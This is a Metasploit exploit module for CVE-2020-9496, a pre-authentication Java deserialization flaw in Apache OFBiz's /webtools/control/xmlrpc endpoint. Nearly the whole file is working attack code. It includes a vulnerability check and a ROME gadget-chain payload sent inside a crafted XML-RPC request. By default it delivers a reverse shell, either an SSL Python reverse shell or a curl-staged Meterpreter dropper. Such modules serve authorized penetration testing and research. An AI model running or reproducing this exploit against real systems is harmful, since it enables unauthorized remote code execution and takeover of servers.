##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::JavaDeserialization

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache OFBiz XML-RPC Java Deserialization',
        'Description' => %q{
          This module exploits a Java deserialization vulnerability in Apache
          OFBiz's unauthenticated XML-RPC endpoint /webtools/control/xmlrpc for
          versions prior to 17.12.04.
        },
        'Author' => [
          'Alvaro Muñoz', # Discovery
          'wvu' # Exploit
        ],
        'References' => [
          ['CVE', '2020-9496'],
          ['URL', 'https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz'],
          ['URL', 'https://ofbiz.apache.org/release-notes-17.12.04.html'],
          ['URL', 'https://issues.apache.org/jira/browse/OFBIZ-11716']
        ],
        'DisclosureDate' => '2020-07-13', # Vendor release note
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => false,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_python_ssl'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper,
              'DefaultOptions' => {
                'CMDSTAGER::FLAVOR' => :curl,
                'PAYLOAD' => 'linux/x64/meterpreter_reverse_https'
              }
            }
          ]
        ],
        'DefaultTarget' => 1,
        'DefaultOptions' => {
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      Opt::RPORT(8443),
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])
  end

  def check
    # Send an empty serialized object
    res = send_request_xmlrpc('')

    unless res
      return CheckCode::Unknown('Target did not respond to check.')
    end

    if res.body.include?('Failed to read result object: null')
      return CheckCode::Vulnerable('Target can deserialize arbitrary data.')
    end

    CheckCode::Safe('Target cannot deserialize arbitrary data.')
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end

  def execute_command(cmd, _opts = {})
    vprint_status("Executing command: #{cmd}")

    res = send_request_xmlrpc(
      # framework/webapp/lib/rome-0.9.jar
      generate_java_deserialization_for_command('ROME', 'bash', cmd)
    )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, "Failed to execute command: #{cmd}")
    end

    print_good("Successfully executed command: #{cmd}")
  end

  def send_request_xmlrpc(data)
    # http://xmlrpc.com/
    # https://ws.apache.org/xmlrpc/
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/webtools/control/xmlrpc'),
      'ctype' => 'text/xml',
      'data' => <<~XML
        <?xml version="1.0"?>
        <methodCall>
          <methodName>#{rand_text_alphanumeric(8..42)}</methodName>
          <params>
            <param>
              <value>
                <struct>
                  <member>
                    <name>#{rand_text_alphanumeric(8..42)}</name>
                    <value>
                      <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">#{Rex::Text.encode_base64(data)}</serializable>
                    </value>
                  </member>
                </struct>
              </value>
            </param>
          </params>
        </methodCall>
      XML
    )
  end

end
